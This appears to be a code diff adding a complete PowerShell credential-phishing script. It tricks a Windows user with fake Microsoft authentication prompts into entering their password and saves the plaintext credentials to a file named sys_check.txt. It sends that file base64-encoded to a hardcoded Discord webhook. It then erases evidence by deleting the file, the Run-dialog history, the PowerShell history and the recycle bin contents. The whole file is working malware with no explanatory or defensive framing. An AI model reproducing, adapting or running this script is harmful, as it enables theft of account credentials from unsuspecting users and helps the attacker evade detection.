@@ -1,0 +1,101 @@
+$FileName = "sys_check.txt"
+
+function Get-Creds {
+    $form = $null
+    while ($form -eq $null) {
+        $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
+        $cred.getnetworkcredential().password
+
+        if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
+            if(-not ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule -like "*PresentationCore*" -or $_.ManifestModule -like "*PresentationFramework*" })) {
+                Add-Type -AssemblyName PresentationCore,PresentationFramework
+            }
+
+            $msgBody = "Credentials cannot be empty!"
+            $msgTitle = "Error"
+            $msgButton = 'Ok'
+            $msgImage = 'Stop'
+            $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
+            Write-Host "The user clicked: $Result"
+            $form = $null
+        } else {
+            $creds = $cred.GetNetworkCredential() | fl
+            return $creds
+        }
+    }
+}
+
+function Pause-Script {
+    Add-Type -AssemblyName System.Windows.Forms
+    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
+    $o = New-Object -ComObject WScript.Shell
+
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
+            break
+        } else {
+            $o.SendKeys("{CAPSLOCK}")
+            Start-Sleep -Seconds $pauseTime
+        }
+    }
+}
+
+function Caps-Off {
+    Add-Type -AssemblyName System.Windows.Forms
+    $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
+
+    if ($caps -eq $true) {
+        $key = New-Object -ComObject WScript.Shell
+        $key.SendKeys('{CapsLock}')
+    }
+}
+
+Pause-Script
+Caps-Off
+
+Add-Type -AssemblyName PresentationCore,PresentationFramework
+$msgBody = "Please authenticate your Microsoft Account."
+$msgTitle = "Authentication Required"
+$msgButton = 'Ok'
+$msgImage = 'Warning'
+$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
+Write-Host "The user clicked: $Result"
+
+$creds = Get-Creds
+
+echo $creds >> $env:USERPROFILE\$FileName
+
+function Send-TextFileToDiscordChannel {
+    param (
+        [string]$FilePath,
+        [string]$WebhookUrl
+    )
+
+    if (-not (Test-Path -Path $FilePath -PathType Leaf)) {
+        Write-Error "File '$FilePath' not found."
+        return
+    }
+
+    $fileContent = Get-Content -Path $FilePath -Raw
+    $fileBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
+    $secureString = [System.Convert]::ToBase64String($fileBytes)
+    $payload = @{
+        content = $secureString
+    } | ConvertTo-Json
+
+    try {
+        Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "application/json" -Body $payload
+        Write-Output "File '$FilePath' successfully sent to Discord channel."
+    } catch {
+        Write-Error "Failed to send file '$FilePath' to Discord channel: $_"
+    }
+}
+
+Send-TextFileToDiscordChannel -FilePath "$env:USERPROFILE\sys_check.txt" -WebhookUrl "https://discordapp.com/api/webhooks/1208302508607279185/cIM-H8mB-Txf2yqUW12819rlKaYMQ6g3IuTJJ058vTDieVw6qlzCJHgKlT8xr6IEDB5j"
+
+rm $env:USERPROFILE\sys_check.txt -r -Force -ErrorAction SilentlyContinue
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+exit
